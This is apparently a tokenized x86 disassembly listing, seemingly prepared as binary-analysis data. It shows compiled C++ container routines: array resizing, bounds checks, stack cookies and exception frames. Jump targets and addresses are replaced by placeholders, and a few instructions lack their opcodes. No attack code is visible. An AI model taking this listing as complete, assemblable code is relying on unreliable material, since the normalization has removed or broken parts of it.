mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp edi ebx
jbe r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
mov ecx esi
call sub_410bc0
mov ebx [ esi + 0xc ]
cmp ebx [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] ebx
test esi esi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov edi edx
shr edi 0x1f
add edi edx
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
xor eax eax
lea ecx [ edi + edi * 2 ]
shl ecx 0x6
lea edi [ ecx + ebx ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_40fec0
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov [ ebx ] 0x0
test edi edi
je r-xdata
call sub_4407b7
mov eax [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
cmp [ edi + 0xc ] eax
ja r-xdata
call sub_4407b7
mov esi [ esp + 0x24 ]
cmp esi [ edi + 0x10 ]
jbe r-xdata
cmp eax [ edi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp eax ecx
je r-xdata
mov eax [ ebx ]
mov ecx [ edi ]
test eax eax
je r-xdata
mov esi [ esp + 0x24 ]
mov ecx [ edi ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
cmp [ edi + 0xc ] esi
ja r-xdata
pop esi
pop ebp
mov eax ebx
pop ebx
pop ecx
retn 0x14
mov ecx [ edi + 0x10 ]
mov [ esp + 0xc ] 0x0
mov edx [ esp + 0xc ]
push edx
mov edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x1c ]
push edx
push ecx
mov ecx esi
call sub_412830
mov ebp [ edi + 0x10 ]
mov ebx eax
add esp 0x10
mov esi ebx
cmp ebx ebp
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
mov [ edi + 0x10 ] ebx
mov eax [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
pop ecx
retn 0x14
lea esp [ esp ]
call sub_402480
add esi 0xc0
cmp esi ebp
jne r-xdata
sub_40ff80
cmp esi 0x1555555
jbe r-xdata
mov ecx esi
call sub_410f70
lea ecx [ esi + esi * 2 ]
shl ecx 0x6
add ecx eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ecx
mov al 0x1
retn
jmp sub_411920
sub_40ffb0
push esi
mov esi [ ebx + 0xc ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x14 ] 0x0
pop esi
retn
push edi
mov edi [ ebx + 0x10 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0xc ]
push eax
call sub_43f960
add esp 0x4
pop edi
call sub_402480
add esi 0xc0
cmp esi edi
jne r-xdata
sub_410000
push ecx
mov ecx [ esp + 0x8 ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push edi
mov edx esi
call sub_412890
lea eax [ esi + esi * 2 ]
shl eax 0x6
add eax edi
add esp 0x10
retn 0x4
sub_410030
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov edi eax
mov ebx [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov ecx ebx
sub ecx esi
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp esi ebx
jbe r-xdata
xor esi esi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ edi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
mov ecx edi
call sub_410fd0
mov ebx [ edi + 0xc ]
cmp ebx [ edi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov edi [ edi ]
mov ebp edi
mov [ esp + 0x18 ] ebx
test edi edi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
sub ecx esi
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov esi edx
shr esi 0x1f
add esi edx
mov eax [ edi ]
jmp r-xdata
call sub_4407b7
xor eax eax
imul esi esi 0xd8
add esi ebx
cmp esi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp esi [ edi + 0xc ]
jae r-xdata
sub_410100
sub esp 0x8
mov ecx [ esp + 0xc ]
mov [ esp + 0x4 ] 0x0
mov eax [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push edi
mov edx esi
call sub_412930
mov eax esi
imul eax eax 0xd8
add eax edi
add esp 0x14
retn 0x4
sub_410130
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp edi ebx
jbe r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
mov ecx esi
call sub_4113f0
mov ebx [ esi + 0xc ]
cmp ebx [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] ebx
test esi esi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
xor eax eax
lea ecx [ edi * 8 ]
sub ecx edi
lea edi [ ebx + ecx * 4 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_410210
push ecx
mov ecx [ esp + 0x8 ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push edi
mov edx esi
call sub_4129f0
lea edx [ esi * 8 ]
sub edx esi
lea eax [ edi + edx * 4 ]
add esp 0x10
retn 0x4
sub_410240
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov eax [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx eax
sub ecx edi
test ecx 0xfffffffc
jne r-xdata
cmp edi eax
jbe r-xdata
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push edx
push eax
push ecx
mov eax esi
call sub_411750
mov edi [ esi + 0xc ]
cmp edi [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] edi
test esi esi
jne r-xdata
call sub_4407b7
mov ebx [ esp + 0x2c ]
sub ebx edi
sar ebx 0x2
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
xor eax eax
lea edi [ edi + ebx * 4 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_4102f0
mov eax esi
mov ecx edi
test esi esi
jbe r-xdata
lea eax [ edi + esi * 4 ]
retn
push ebx
lea esp [ esp ]
mov ebx [ edx ]
mov [ ecx ] ebx
dec eax
add ecx 0x4
test eax eax
ja r-xdata
pop ebx
sub_410320
sub esp 0x1c
push ebx
push ebp
mov ebp [ esp + 0x28 ]
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
push esi
push edi
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov esi [ ecx ]
mov ecx [ esp + 0x38 ]
mov eax [ ebx ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x34 ]
mov edi [ ebx + 0x18 ]
push eax
push 0x1
push ebp
push ebx
call sub_411a90
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
call sub_4407b7
mov ecx [ esp + 0x38 ]
cmp ecx eax
je r-xdata
mov esi [ ebx + 0x18 ]
mov edx [ ebx ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ ecx ]
cmp edx [ eax + 0xc ]
jae r-xdata
mov eax [ esp + 0x3c ]
cmp eax esi
jne r-xdata
call sub_4407b7
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
cmp ecx edx
je r-xdata
push ecx
lea ecx [ esp + 0x20 ]
push ecx
call sub_4119a0
mov edx [ eax ]
mov [ ebp ] edx
mov eax [ eax + 0x4 ]
pop edi
mov [ ebp + 0x4 ] eax
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0x1c
retn 0x10
push ecx
push 0x1
push ebp
push ebx
mov edi eax
call sub_411a90
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edi [ esp + 0x34 ]
mov edx [ edi ]
cmp [ eax + 0xc ] edx
jbe r-xdata
mov eax [ ebx + 0x18 ]
mov edi [ eax + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx [ esp + 0x34 ]
cmp ecx [ edx ]
jae r-xdata
cmp eax esi
jne r-xdata
jae r-xdata
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
call sub_424ee0
mov edx [ edi ]
mov eax [ esp + 0x18 ]
cmp [ eax + 0xc ] edx
jae r-xdata
mov ecx [ esp + 0x34 ]
mov eax edx
push eax
push 0x0
push ebp
push ebx
call sub_411a90
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ ebx + 0x18 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx ]
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] eax
call sub_4264e0
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x14 ]
call sub_4105a0
mov edi [ esp + 0x18 ]
test al al
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
cmp [ eax + 0xc ] edx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
push edi
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ ecx ]
cmp edx [ edi + 0xc ]
jae r-xdata
push 0x0
push ebp
push ebx
mov edi eax
call sub_411a90
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edi [ esp + 0x40 ]
push 0x1
push ebp
push ebx
call sub_411a90
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov eax [ esp + 0x34 ]
push eax
push 0x1
push ebp
push ebx
call sub_411a90
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ esp + 0x34 ]
push edx
sub_4104f0
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov eax [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx eax
sub ecx edi
test ecx 0xfffffffc
jne r-xdata
cmp edi eax
jbe r-xdata
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push edx
push eax
push ecx
mov eax esi
call sub_411ce0
mov edi [ esi + 0xc ]
cmp edi [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] edi
test esi esi
jne r-xdata
call sub_4407b7
mov ebx [ esp + 0x2c ]
sub ebx edi
sar ebx 0x2
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
xor eax eax
lea edi [ edi + ebx * 4 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_4105c0
mov ecx [ esp + 0x4 ]
push ebp
mov ebp [ esp + 0xc ]
test ebp ebp
jne r-xdata
push ebx
push esi
push edi
mov edi [ ecx + 0x14 ]
cmp eax edi
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
sub edi eax
cmp ebp edi
ja r-xdata
pop ebp
retn 0x8
mov edx 0x1
sub edx ebp
add edi edx
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov [ esp + 0x18 ] ecx
add ecx 0x4
mov [ esp + 0x18 ] ecx
mov ecx [ ecx ]
jmp r-xdata
lea esp [ esp ]
push edi
lea ebx [ ecx + eax ]
push 0x7c
push ebx
call sub_441e90
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax + 0x18 ] 0x10
mov ecx [ esp + 0x18 ]
jb r-xdata
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
lea ebx [ esi + 0x1 ]
push 0x7c
push ebx
call sub_441e90
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
sub eax ecx
pop ebp
retn 0x8
mov ecx [ ecx ]
mov eax ebp
mov ecx r--data
mov edx esi
call sub_413160
test eax eax
je r-xdata
sub_410680
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
lea edx [ ecx * 4 ]
push edx
call sub_43fa1d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_442eab
int3
sub_4106e0
push ebp
mov ebp esp
push 0xffffffff
push sub_459cb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x50 ] ebx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
inc eax
cmp esi eax
jae r-xdata
call sub_411920
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0x9249249
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
mov ecx esi
shr ecx 0x1
mov edx 0x9249249
sub edx ecx
cmp edx esi
jae r-xdata
mov eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x4c ]
call sub_4297d0
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0x1c ]
push esi
mov edx edi
call sub_4124d0
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_412520
mov eax [ ebp + 0x10 ]
lea edi [ eax + 0x1c ]
lea ebx [ ebp - 0x4c ]
call sub_412500
mov ecx ebx
mov ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x30 ]
call sub_4297d0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1c ]
push edx
mov edx [ ebx + 0x10 ]
push eax
call sub_4124d0
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
lea edx [ ebp - 0x30 ]
call sub_40f9e0
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0x1c
mov ebx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
lea edi [ ebx - 0x1c ]
lea ebx [ ebp - 0x30 ]
call sub_412500
mov ecx ebx
jmp r-xdata
add esi ecx
xor esi esi
jmp r-xdata
call sub_429da0
test esi esi
ja r-xdata
mov esi eax
cmp esi eax
jae r-xdata
mov ecx esi
call sub_429880
push 0x0
call sub_43fa1d
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x54 ]
lea ecx [ esi * 8 ]
sub ecx esi
lea ecx [ eax + ecx * 4 ]
mov [ ebx + 0x14 ] ecx
lea ecx [ edx * 8 ]
sub ecx edx
lea edx [ eax + ecx * 4 ]
mov [ ebx + 0x10 ] edx
mov [ ebx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ebx + 0xc ]
push ecx
call sub_412b30
mov edx [ ebx + 0xc ]
push edx
call sub_43f960
mov edx [ ebp - 0x50 ]
add esp 0x8
mov ecx [ ebp + 0x10 ]
sub ecx [ ebx + 0xc ]
mov [ ebp - 0x54 ] eax
mov eax 0x92492493
imul ecx
add edx ecx
mov ecx [ ebp - 0x54 ]
sar edx 0x4
mov edi edx
xor eax eax
mov [ ebp - 0x4 ] eax
shr edi 0x1f
add edi edx
mov [ ebp - 0x58 ] eax
lea eax [ edi * 8 ]
sub eax edi
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push edx
mov edx [ ebp - 0x5c ]
push ecx
push edx
push eax
mov ecx 0x1
mov [ ebp - 0x60 ] edi
call sub_412790
mov ecx [ ebx + 0xc ]
add esp 0x10
mov [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
push eax
mov eax [ ebp + 0x10 ]
push edx
mov edx [ ebp - 0x54 ]
push eax
mov [ ebp - 0x58 ] 0x1
call sub_412cc0
mov edx [ ebp - 0x54 ]
mov eax [ ebx + 0x10 ]
inc edi
lea ecx [ edi * 8 ]
sub ecx edi
lea edx [ edx + ecx * 4 ]
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] 0x2
call sub_412cc0
mov edi [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add esp 0xc
cmp [ ebx + 0xc ] 0x0
lea edx [ edx + eax + 0x1 ]
mov [ ebp - 0x50 ] edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_4108ba
cmp [ ebp - 0x58 ] 0x1
mov esi [ ebp - 0x60 ]
mov ebx [ ebp - 0x54 ]
jle r-xdata
cmp [ ebp - 0x58 ] 0x0
jle r-xdata
mov eax [ ebp - 0x50 ]
lea ecx [ esi * 8 ]
sub ecx esi
push eax
lea edi [ ebx + ecx * 4 ]
mov eax ebx
call sub_412b30
add esp 0x4
push ebx
call sub_43f960
add esp 0x4
push 0x0
push 0x0
call sub_442eab
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
mov edx [ ebp - 0x50 ]
lea eax [ esi + 0x1 ]
push edx
lea ecx [ eax * 8 ]
sub ecx eax
lea edx [ esi * 8 ]
sub edx esi
lea edi [ ebx + ecx * 4 ]
lea eax [ ebx + edx * 4 ]
call sub_412b30
add esp 0x4
mov eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x4c ]
call sub_4297d0
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0x1c ]
push esi
mov edx edi
call sub_4124d0
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_412520
mov eax [ ebp + 0x10 ]
lea edi [ eax + 0x1c ]
lea ebx [ ebp - 0x4c ]
call sub_412500
mov ecx ebx
mov ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x30 ]
call sub_4297d0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1c ]
push edx
mov edx [ ebx + 0x10 ]
push eax
call sub_4124d0
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
lea edx [ ebp - 0x30 ]
call sub_40f9e0
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0x1c
mov ebx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
lea edi [ ebx - 0x1c ]
lea ebx [ ebp - 0x30 ]
call sub_412500
mov ecx ebx
jmp r-xdata
call sub_429da0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_410a40
sub esp 0x10
mov eax [ ebx + 0x14 ]
push ebp
mov ecx 0xfffffff
sub ecx eax
push esi
push edi
mov [ esp + 0x10 ] 0x1
cmp ecx 0x1
jae r-xdata
mov ecx eax
shr ecx 0x1
cmp ecx 0x8
jae r-xdata
call sub_4120d0
cmp ecx 0x1
jbe r-xdata
mov ecx 0x8
jmp r-xdata
mov ebp [ ebx + 0x18 ]
mov ecx [ esp + 0x10 ]
add ecx eax
shr ebp 0x2
call sub_410680
mov ecx [ ebx + 0x10 ]
mov [ esp + 0x14 ] eax
lea esi [ ebp * 4 ]
lea edi [ esi + eax ]
mov eax [ ebx + 0x14 ]
add eax eax
add eax eax
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
sar eax 0x2
lea ecx [ eax * 4 ]
add edi ecx
test eax eax
jbe r-xdata
mov edx 0xfffffff
sub edx ecx
cmp eax edx
ja r-xdata
mov eax [ esp + 0x10 ]
cmp ebp eax
ja r-xdata
push ecx
push edx
mov edx [ esp + 0x1c ]
push ecx
lea eax [ esi + edx ]
push eax
call sub_43fbf5
add esp 0x10
mov [ esp + 0x10 ] ecx
mov ecx [ ebx + 0x10 ]
lea ebp [ eax * 4 ]
mov eax ebp
sar eax 0x2
test eax eax
jbe r-xdata
mov eax [ ebx + 0x10 ]
sar esi 0x2
lea ecx [ esi * 4 ]
lea edx [ ecx + edi ]
mov [ esp + 0x18 ] edx
test esi esi
jbe r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x14 ]
lea ecx [ eax + ebp ]
sub esi ecx
add esi eax
sar esi 0x2
lea eax [ esi * 4 ]
lea edi [ eax + edx ]
test esi esi
jbe r-xdata
add eax eax
add eax eax
push eax
push ecx
push eax
push edi
call sub_43fbf5
add esp 0x10
mov ecx [ esp + 0x10 ]
sub ecx ebp
je r-xdata
push ecx
push eax
push ecx
push edi
call sub_43fbf5
add esp 0x10
mov ecx [ esp + 0x10 ]
test ecx ecx
jbe r-xdata
push eax
push ecx
push eax
push edx
call sub_43fbf5
add esp 0x10
test ebp ebp
jbe r-xdata
mov edi [ esp + 0x18 ]
xor eax eax
[ edi ]
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
xor eax eax
[ edi ]
mov edi [ esp + 0x14 ]
mov ecx ebp
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
add [ ebx + 0x14 ] ecx
pop edi
pop esi
mov [ ebx + 0x10 ] eax
pop ebp
add esp 0x10
retn
push eax
call sub_43f960
add esp 0x4
sub_410bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_45a2f6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x18 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x1ac ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1a0 ] ebx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
inc eax
cmp esi eax
jae r-xdata
call sub_411920
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebx + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0x1555555
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x2aaaaaab
imul edi
mov edi [ ebp - 0x1ac ]
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
jae r-xdata
mov ecx esi
shr ecx 0x1
mov edx 0x1555555
sub edx ecx
cmp edx esi
jae r-xdata
lea edx [ ebp - 0x19c ]
push edx
call sub_411f30
mov [ ebp - 0x4 ] 0x5
mov esi [ ebx + 0x10 ]
push esi
lea edi [ esi - 0xc0 ]
push edi
mov edx esi
call sub_412570
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1a0 ] 0x0
mov eax [ ebp - 0x1a0 ]
mov ecx [ ebp - 0x1a0 ]
mov edx [ ebp - 0x1a0 ]
push eax
push ecx
push edx
mov eax esi
mov ecx edi
call sub_412e40
mov ecx [ ebp + 0x10 ]
add esp 0xc
lea ebx [ ecx + 0xc0 ]
lea eax [ ebp - 0x19c ]
call sub_4125a0
lea esi [ ebp - 0x19c ]
lea edx [ ebp - 0xdc ]
push edx
call sub_411f30
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0xc0 ]
push eax
call sub_412570
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
lea edx [ ebp - 0xdc ]
push edx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_410000
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0xc0
mov ebx [ ebx + 0x10 ]
mov ecx [ ebp + 0x10 ]
add ebx 0xffffff40
lea eax [ ebp - 0xdc ]
call sub_4125a0
lea esi [ ebp - 0xdc ]
jmp r-xdata
add esi ecx
xor esi esi
jmp r-xdata
call sub_402480
mov ecx esi
call sub_410f70
mov edx [ ebp + 0x10 ]
sub edx [ ebx + 0xc ]
mov ecx eax
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov edi edx
xor eax eax
